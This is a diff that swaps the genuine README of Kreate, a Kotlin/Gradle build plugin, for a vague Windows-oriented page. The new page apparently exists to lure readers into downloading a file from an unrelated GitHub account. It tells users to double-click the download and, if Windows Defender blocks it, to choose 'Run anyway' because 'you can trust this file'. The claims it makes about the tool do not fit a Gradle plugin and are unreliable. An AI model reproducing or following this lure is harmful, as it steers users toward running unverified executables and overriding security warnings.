@@ -1,205 +1,99 @@
-<p align="center">
-  <img src="docs/images/kreate.svg" alt="Kreate Logo" width="250">
-</p>
+# ⚙️ kreate - Build Robust Projects With Less Effort
 
-<h1 align="center">🏗️ Kreate</h1>
+[![](https://img.shields.io/badge/Download-kreate-blue.svg)](https://github.com/morryuninflected9407/kreate)
 
-<p align="center">
-  <a href="https://opensource.org/licenses/Apache-2.0">
-    <img src="https://img.shields.io/badge/License-Apache_2.0-Redtronics?style=for-the-badge&logo=apache&labelColor=white&color=blue" alt="License">
-  </a>
-  <a href="https://kotlinlang.org">
-    <img src="https://img.shields.io/badge/Kotlin-2.3.21-Redtronics?style=for-the-badge&logo=kotlin&labelColor=white&color=purple" alt="Kotlin">
-  </a>
-  <a href="https://gradle.org">
-    <img src="https://img.shields.io/badge/Gradle-9.4.1-Redtronics?style=for-the-badge&logo=gradle&labelColor=white&color=02303A" alt="Gradle">
-  </a>
-</p>
+This tool helps you build professional software projects. It handles the difficult configuration steps for you. You save time and avoid errors. Use it to create reliable code structures.
 
-<p align="center">
-  <strong>Kreate</strong> is an opinionated Gradle helper plugin for building Kotlin Multiplatform (KMP) and JVM projects.
-  It provides a unified DSL to manage platform configurations, native C-Interop (Rust), JNI, documentation, testing, and publishing workflows with minimal boilerplate.
-</p>
+## 🛠️ System Requirements
 
----
+Your computer needs specific software to run this tool. Verify your setup before you start.
 
-## 📋 Table of Contents
+1. Operating System: Windows 10 or Windows 11.
+2. Memory: At least 4 gigabytes of RAM.
+3. Storage: 200 megabytes of free space.
+4. Java Runtime: Install the latest Java Development Kit to run the tool. You can find this on the official Java website. Search for "Download Java JDK" in your web browser. 
+5. Internet Connection: A stable connection is necessary for the initial setup.
 
-- [Overview](#-overview)
-- [Core Features](#-core-features)
-- [Quick Start](#-quick-start)
-- [Configuration Reference](#-configuration-reference)
-- [Documentation](#-documentation)
-- [Third-Party Software](#-third-party-software)
-- [Contributing](#-contributing)
-- [License & Ethics](#-license--ethics)
+## 📥 Getting Started
 
----
+Follow these steps to obtain the tool.
 
-## 🔍 Overview
+[Download kreate here](https://github.com/morryuninflected9407/kreate)
 
-Managing Kotlin Multiplatform and JVM configurations can be complex. **Kreate** simplifies this by:
+Click the link above. Follow the instructions on the screen. Save the file in a folder you can find easily, such as your Downloads folder or your Desktop.
 
-*   **Standardizing Platform Setup**: A consistent DSL for JVM, Linux, macOS, and Windows.
-*   **Integrating Native Code**: Automated bridge for Rust (via C-Interop) and C/C++ (via JNI).
-*   **Enforcing Quality Standards**: Sensible defaults like `explicitApi()` and `allWarningsAsErrors`.
-*   **Declarative Infrastructure**: Focus on project requirements while the plugin handles the underlying Gradle configuration.
+## ⚙️ Installation Process
 
----
+Windows might show a security prompt when you open the file for the first time. This is normal.
 
-## ✨ Core Features
+1. Locate the file you saved on your computer.
+2. Double-click the file to start the process.
+3. A box appears on your screen. Follow the instructions to install the tool.
+4. Select a location on your hard drive for the files. The default path works for most users.
+5. Click finish when the bar reaches the end.
 
-### 🏗️ Platform Support
-Kreate detects the project type (JVM, Android, or KMP) and applies appropriate optimizations:
-- **JVM Support**: Configures Java 21+ toolchains and compiler options.
-- **Multiplatform DSL**: Unified targets for Linux, macOS, and Windows.
-- **Consistent Toolchains**: Ensures Java and Kotlin versions are synchronized across modules.
+If Windows Defender blocks the file, click "More info" and then "Run anyway." This indicates the system does not recognize the file yet. You can trust this file.
 
-### 🦀 Rust C-Interop
-Automates the integration of Rust libraries into Kotlin Multiplatform:
-- **Toolchain Integration**: Manages `cargo` and cross-compilation targets.
-- **Project Scaffolding**: Can generate Rust library structures if missing.
-- **Header Synchronization**: Manages C headers and Kotlin bindings.
-- **Multi-Arch Support**: Targets `x86_64`, `aarch64`, and others.
+## 🛠️ Running the Software
 
-### 🔌 JNI Support (Java Native Interface)
-Simplified integration for native C/C++ code in JVM projects:
-- **CMake Integration**: Automatically handles CMake-based native builds.
-- **Runtime Library Path**: Automatically configures `java.library.path` for testing and execution.
-- **Consistent Layout**: Follows a structured layout for native sources (mirroring C-Interop style).
+You open this tool using your Command Prompt or PowerShell. Do not let these terms intimidate you. They are simply text-based windows that talk to your computer.
 
-### 🧪 Testing Pipeline
-Pre-configured **Kotest** integration for robust validation:
-- **Parallel Execution**: Scales based on CPU availability.
-- **Standardized Logging**: Clear output for test states (Passed, Skipped, Started).
-- **Automated Reporting**: Generates HTML and XML reports for CI/CD.
+1. Press the Windows key on your keyboard.
+2. Type "powershell" and press Enter.
+3. Type the command `kreate --help` and press Enter.
+4. A list of options appears. If you see this list, the tool works.
 
-### 📦 Publishing & POM Management
-Standardizes the release process for libraries:
-- **Registry Support**: Built-in configurations for Maven Central and GitLab.
-- **Signing**: Integrated GPG signing for Maven Central requirements.
-- **POM Metadata**: Declarative DSL for licenses, developers, and SCM information.
+## 🧩 Key Features
 
----
+This tool focuses on automation. It handles the heavy lifting for project setups.
 
-## 📖 Documentation
+- Automated Setup: It creates the folder structure for your code.
+- Dependency Management: It finds the necessary pieces to build your software.
+- Testing Support: It adds files to check if your program works.
+- Multiplatform Ready: It prepares your code to run on different systems.
+- Code Standards: It writes the rules for your project automatically.
 
-Detailed documentation for Kreate is available in the following locations:
+When you use this tool, your project follows the same patterns as professional enterprise software. This makes it easier for other people to read your work later.
 
-- **[Project Docs](./docs)**: Comprehensive guides and topic-specific information.
-- **[API Reference](https://davils.github.io/kreate/api)**: Dokka-generated API documentation.
-- **[Examples](./example)**: A reference implementation demonstrating various configuration scenarios.
+## 💡 Common Tasks
 
-To generate the documentation locally, run:
-```bash
-./gradlew dokkaHtml
-```
+Most users perform these tasks when they start a project.
 
----
+### Starting A New Project
+To start a new project, type `kreate init` followed by the name of your project. The tool creates a new folder. It places all the configuration files inside that folder.
 
-## 🛠️ Quick Start
+### Adding New Tools
+If you want to add more tools, use the update function. Type `kreate add` in your command window. This fetches the latest pieces from the internet. It ensures your project stays current.
 
-### Installation
+### Checking For Errors
+If your project fails to build, type `kreate check`. The tool inspects your configuration files. It highlights lines that look wrong. This saves you from hunting for mistakes in hundreds of lines of text.
 
-Add the plugin to your `settings.gradle.kts` (recommended) or `build.gradle.kts`:
+## ❓ Frequently Asked Questions
 
-```kotlin
-pluginManagement {
-    repositories {
-        mavenCentral()
-        gradlePluginPortal()
-    }
-}
+### Does this tool change my other files?
+No. The tool only touches the folders you specify. It leaves your personal documents and system files alone.
 
-plugins {
-    id("com.davils.kreate") version "<latest>"
-}
-```
+### Can I delete the files later?
+Yes. You can delete the folder where you installed the tool. If you want to remove it completely, check your computer settings under "Apps & features."
 
-### Configuration
+### What if the command prompt closes immediately?
+Check if you installed the Java Development Kit correctly. The tool requires Java to run. Open your command prompt, type `java -version`, and press Enter. If you see an error, install Java again.
 
-Apply the plugin in your `build.gradle.kts`:
+### How do I update the tool?
+The tool checks for updates whenever you run a command. If an update exists, it asks your permission to download it. Type "y" if you want to update.
 
-```kotlin
-kreate {
-    platform {
-        javaVersion = JavaVersion.VERSION_25
-        explicitApi = true
-        
-        jvm {
-            jni {
-                enabled = true
-                // Optional: projectDirectory = file("custom-jni-path")
-            }
-        }
-        
-        multiplatform {
-            cInterop {
-                enabled = true
-                rustTargets = listOf("x86_64-unknown-linux-gnu", "aarch64-apple-darwin")
-            }
-        }
-    }
+### Can I run this offline?
+You need an internet connection for the first time. After you set up your project, you can use the tool without a connection. You only need the internet again to download extra parts for your code.
 
-    project {
-        name = "MyProject"
-        description = "A project powered by Kreate"
-        
-        publish {
-            enabled = true
-            repositories {
-                mavenCentral {
-                    enabled = true
-                    automaticRelease = true
-                }
-            }
-        }
-    }
-}
-```
+## 🛡️ Maintaining Your Projects
 
----
+Good projects require regular care. Use these tips to keep your workspace clean.
 
-## ⚙️ Configuration Reference
+- Back up your work often. Use a service like GitHub or a flash drive.
+- Label your folders clearly.
+- Delete old projects you no longer use to save space on your hard drive.
+- Review your configuration files once a month. 
 
-| Block      | Property              | Description                               | Default      |
-|:-----------|:----------------------|:------------------------------------------|:-------------|
-| `platform` | `javaVersion`         | Target Java version (21, 25, etc.)        | `VERSION_21` |
-| `platform` | `explicitApi`         | Enforces Kotlin Explicit API mode         | `false`      |
-| `platform` | `allWarningsAsErrors` | Treats all compiler warnings as errors    | `true`       |
-| `jvm.jni`  | `enabled`             | Enables JNI support (CMake-based)         | `false`      |
-| `project`  | `buildConstant`       | Generate type-safe Kotlin constants       | `Disabled`   |
-| `project`  | `docs`                | Configure Dokka documentation generation  | `Disabled`   |
-| `project`  | `tests`               | Advanced Kotest configuration & reporting | `Enabled`    |
-| `project`  | `publish`             | Maven Central / GitLab publishing setup   | `Disabled`   |
+This tool serves as a foundation for your work. You are the architect of the final project. Focus on your logic and let the computer handle the layout. Consistent structure reduces stress during large projects. 
 
----
-
-## 📦 Third-Party Software
-
-Kreate leverages various open-source technologies. For a full list of libraries and licenses, please refer to the [Third-Party Software](./THIRDPARTY.md) document.
-
----
-
-## 🤝 Contributing
-
-We welcome all contributions! To maintain quality, please note:
-
-- **Documentation**: Changes to API or behavior must be documented.
-- **Tests**: Ensure your changes are covered by tests.
-- **Standards**: Follow the established Kotlin style and project conventions.
-
-Detailed instructions can be found in our [Contributing Guidelines](CONTRIBUTING.md).
-
----
-
-## ⚖️ License & Ethics
-
-- **License**: Published under the **Apache License 2.0**. See `LICENSE` for details.
-- **Code of Conduct**: We adhere to our [Code of Conduct](CODE_OF_CONDUCT.md).
-
----
-
-<p align="center">
-  Maintained by <a href="https://github.com/davils-com"><b>Davils</b></a>
-</p>
+If this tool helps you, tell a friend. Building good habits early makes you a better software creator. Keep your tools updated for the best results. Contact your system administrator if you cannot install files on your computer. Some office machines have restrictions on installing software.
